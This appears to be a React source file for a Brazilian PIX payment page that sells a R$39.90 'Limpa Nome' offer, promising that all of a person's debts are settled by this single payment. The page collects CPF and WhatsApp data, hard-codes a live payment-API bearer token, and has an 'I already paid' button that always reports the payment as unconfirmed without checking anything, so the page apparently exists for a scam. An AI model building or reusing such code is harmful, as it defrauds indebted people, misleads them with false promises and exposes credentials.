import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Copy,
  QrCode,
  CheckCircle2,
  HelpCircle,
  ChevronDown,
  AlertCircle,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { TrustBadge } from "@/components/TrustBadge";
import { toast } from "sonner";
import {
  Collapsible,
  CollapsibleContent,
  CollapsibleTrigger,
} from "@/components/ui/collapsible";
// ADICIONADO: Skeleton para o estado de carregamento
import { Skeleton } from "@/components/ui/skeleton";

// Token da sua API
const API_TOKEN = "298|TFk8AllUCxCBnb3aM7mYJX4RGe9UBHv3uy2KSfbO4c130b92";
const API_URL = "https://virtualpay.online/api/v1/transactions/deposit";

export default function Payment() {
  const navigate = useNavigate();
  const [pixCopied, setPixCopied] = useState(false);

  // --- NOVOS ESTADOS ---
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  
  // Dados do PIX gerado pela API
  const [pixCode, setPixCode] = useState("");
  const [qrCodeImage, setQrCodeImage] = useState(""); // Assumindo que a API retorna um base64
  
  // Dados do usuário vindos da sessão
  const [userName, setUserName] = useState("Cliente");
  const [userCpf, setUserCpf] = useState("***.***.***-**");
  const [userWhatsApp, setUserWhatsApp] = useState("(**) *****-****");
  // --- FIM NOVOS ESTADOS ---

  useEffect(() => {
    const userDataString = sessionStorage.getItem("userData");
    const whatsappString = sessionStorage.getItem("whatsapp");

    if (!userDataString || !whatsappString) {
      toast.error("Sessão expirada. Por favor, comece novamente.");
      navigate("/");
      return;
    }

    try {
      const parsedData = JSON.parse(userDataString);
      setUserName(parsedData.name || "Cliente");
      setUserCpf(parsedData.cpf || "***.***.***-**");
      setUserWhatsApp(whatsappString || "(**) *****-****");

      // Inicia a geração do PIX assim que os dados forem carregados
      generatePix(parsedData.name, parsedData.cpf);
      
    } catch (e) {
      console.error("Erro ao ler dados da sessão:", e);
      toast.error("Erro nos dados. Por favor, comece novamente.");
      navigate("/");
    }
  }, [navigate]);

  // --- NOVA FUNÇÃO PARA GERAR PIX ---
  const generatePix = async (name: string, cpf: string) => {
    setIsLoading(true);
    setError(null);

    // Remove formatação do CPF para a API
    const document = cpf.replace(/\D/g, "");

    const payload = {
      name: name,
      description: "Pagamento referente à negociação Limpa Nome",
      document: document,
      amount: "39.90", // Valor fixo da oferta
    };

    try {
      const response = await fetch(API_URL, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${API_TOKEN}`,
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`Erro na API: ${response.statusText}`);
      }

      const data = await response.json();

      // **IMPORTANTE**: Estou assumindo que a API retorna 'pix_copia_cola' e 'qr_code_base64'
      // Se os nomes dos campos forem outros, ajuste aqui:
      if (data.pix_copia_cola && data.qr_code_base64) {
        setPixCode(data.pix_copia_cola);
        setQrCodeImage(data.qr_code_base64); // Ex: "data:image/png;base64,iVBORw0..."
      } else {
        throw new Error("Resposta da API inválida. Campos esperados não encontrados.");
      }
    } catch (err) {
      console.error("Erro ao gerar PIX:", err);
      setError("Não foi possível gerar o PIX. Por favor, recarregue a página para tentar novamente.");
    } finally {
      setIsLoading(false);
    }
  };
  // --- FIM NOVA FUNÇÃO ---

  const handleCopyPix = () => {
    if (!pixCode) return;
    navigator.clipboard.writeText(pixCode);
    setPixCopied(true);
    toast.success("PIX copiado! Abra seu app e cole para pagar.", {
      duration: 3000,
    });
    setTimeout(() => setPixCopied(false), 3000);
  };

  // MANTIDO: Conforme seu pedido, apenas mostra o toast de erro.
  const handleCheckPayment = () => {
    toast.error("Pagamento não identificado", {
      description:
        "Seu pagamento ainda não foi confirmado. Por favor, aguarde alguns minutos e tente novamente.",
      duration: 4000,
    });
  };

  return (
    <div className="min-h-screen bg-background py-6 md:py-12 px-4">
      <div className="max-w-2xl mx-auto space-y-6 md:space-y-8">
        {/* Header */}
        <div className="text-center space-y-4 animate-slide-up">
          <div className="inline-block px-4 py-2 bg-warning rounded-full mb-2">
            <p className="text-xs md:text-sm font-bold text-foreground">
              🎯 Oferta Especial de Novembro
            </p>
          </div>

          <h1 className="text-2xl md:text-4xl font-bold text-foreground mb-2">
            {/* ATUALIZADO: Nome dinâmico */}
            {userName.split(" ")[0]}, confirme as informações e
            <br />
            finalize o pagamento abaixo
          </h1>
        </div>

        {/* User Confirmation */}
        <div className="bg-card rounded-xl shadow-lg p-4 md:p-6 border border-border animate-slide-up">
          <h3 className="text-lg font-bold text-foreground mb-4 flex items-center gap-2">
            <CheckCircle2 className="w-5 h-5 text-success" />
            Confirme seus dados
          </h3>
          <div className="space-y-2 text-sm md:text-base">
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">Nome:</span>
              {/* ATUALIZADO: Nome dinâmico */}
              <span className="font-semibold text-foreground">{userName}</span>
            </div>
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">CPF:</span>
              {/* ATUALIZADO: CPF dinâmico */}
              <span className="font-semibold text-foreground">{userCpf}</span>
            </div>
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">WhatsApp:</span>
              {/* ATUALIZADO: WhatsApp dinâmico */}
              <span className="font-semibold text-foreground">
                {userWhatsApp}
              </span>
            </div>
          </div>
          <div className="mt-4 p-5 bg-success/10 rounded-lg border-2 border-success/30">
            <p className="text-lg md:text-xl text-foreground font-bold text-center">
              ✓ Todas as suas dívidas serão quitadas por este valor único
            </p>
          </div>
        </div>

        {/* Urgency Alert */}
        <div className="bg-secondary/10 border-2 border-secondary rounded-xl p-6 md:p-8 animate-slide-up">
          <div className="text-center space-y-4">
            <AlertCircle className="w-10 h-10 md:w-12 md:h-12 text-secondary mx-auto" />
            <p className="font-bold text-foreground text-xl md:text-2xl">
              Finalize o pagamento abaixo no valor
            </p>
            <p className="text-6xl md:text-7xl font-bold text-primary">
              R$ 39,90
            </p>
          </div>
        </div>

        {/* PIX Payment Card */}
        <div className="bg-card rounded-2xl shadow-xl p-6 md:p-8 space-y-6 border border-border animate-slide-up">
          {/* ATUALIZADO: QR Code Dinâmico ou Loading */}
          <div className="bg-muted rounded-xl p-6 md:p-8 flex items-center justify-center">
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-40 h-40 md:w-48 md:h-48 bg-card rounded-xl border-2 border-border">
                {isLoading ? (
                  <Skeleton className="w-full h-full" />
                ) : error ? (
                  <div className="p-4 text-destructive text-sm text-center">
                    <AlertCircle className="w-12 h-12 mx-auto mb-2" />
                    {error}
                  </div>
                ) : qrCodeImage ? (
                  <img
                    src={qrCodeImage}
                    alt="QR Code PIX"
                    className="w-full h-full"
                  />
                ) : (
                  <QrCode className="w-28 h-28 md:w-32 md:h-32 text-muted-foreground" />
                )}
              </div>
              <p className="text-xs md:text-sm text-muted-foreground">
                {isLoading ? "Gerando QR Code..." : error ? "Falha ao gerar QR Code" : "Escaneie o QR Code com seu app de pagamento"}
              </p>
            </div>
          </div>

          {/* PIX Copy-Paste */}
          <div className="space-y-4 text-center">
            <p className="text-2xl font-semibold text-foreground">
              PIX COPIA E COLA
            </p>

            <div className="flex flex-col gap-3">
              {/* ATUALIZADO: Caixa do código dinâmica */}
              <div className="w-full bg-muted rounded-lg p-3 text-sm text-muted-foreground font-mono break-all text-left min-h-[40px]">
                {isLoading ? (
                  <Skeleton className="h-5 w-3/4" />
                ) : error ? (
                  <span className="text-destructive text-xs">{error}</span>
                ) : (
                  pixCode
                )}
              </div>

              {/* ATUALIZADO: Botão "Copiar PIX" */}
              <Button
                onClick={handleCopyPix}
                size="lg"
                className="w-full bg-primary hover:bg-primary-hover font-bold transition-all duration-300 text-4xl h-auto py-5"
                disabled={isLoading || !!error || !pixCode} // Desabilita se carregando, com erro ou sem código
              >
                {pixCopied ? (
                  <>
                    <CheckCircle2 className="w-9 h-9 mr-3" />
                    Copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-9 h-9 mr-3" />
                    Copiar PIX
                  </>
                )}
              </Button>
            </div>
          </div>

          <div className="flex justify-center gap-3 pt-4 border-t border-border">
            <TrustBadge variant="security" text="Pagamento seguro" />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4 pt-4">
            <div className="text-center p-3 md:p-4 bg-success/5 rounded-lg border border-success/20">
              <CheckCircle2 className="w-5 h-5 md:w-6 md:h-6 text-success mx-auto mb-2" />
              <p className="text-xs md:text-sm font-medium text-foreground">
                Liberação automática
              </p>
            </div>
            <div className="text-center p-3 md:p-4 bg-success/5 rounded-lg border border-success/20">
              <CheckCircle2 className="w-5 h-5 md:w-6 md:h-6 text-success mx-auto mb-2" />
              <p className="text-xs md:text-sm font-medium text-foreground">
                Consulta imediata
              </p>
            </div>
          </div>
        </div>

        {/* How to Pay Tutorial */}
        <Collapsible className="bg-card rounded-xl shadow-lg border border-border animate-slide-up">
          <CollapsibleTrigger className="w-full p-6 flex items-center justify-between hover:bg-muted/50 transition-colors rounded-xl">
            <div className="flex items-center gap-3">
              <HelpCircle className="w-5 h-5 text-primary" />
              <span className="font-semibold text-foreground">
                Como pagar com PIX?
              </span>
            </div>
            <ChevronDown className="w-5 h-5 text-muted-foreground" />
          </CollapsibleTrigger>
          <CollapsibleContent className="px-6 pb-6">
            <ol className="space-y-3 text-sm text-muted-foreground">
              <li className="flex gap-3">
                <span className="font-bold text-primary">1.</span>
                <span>Abra o app do seu banco</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">2.</span>
                <span>Selecione a opção PIX</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">3.</span>
                <span>Cole o código copiado ou escaneie o QR Code</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">4.</span>
                <span>Confirme o pagamento de R$ 39,90</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">5.</span>
                <span>Pronto! A liberação é automática</span>
              </li>
            </ol>
          </CollapsibleContent>
        </Collapsible>

        {/* Action Button */}
        <div className="animate-slide-up">
          <Button
            size="lg"
            className="w-full h-14 md:h-16 text-lg md:text-xl font-bold bg-success hover:bg-success/90"
            onClick={handleCheckPayment}
            disabled={isLoading} // Desabilita enquanto o PIX está sendo gerado
          >
            Já realizei o pagamento
          </Button>
        </div>
      </div>
    </div>
  );
}
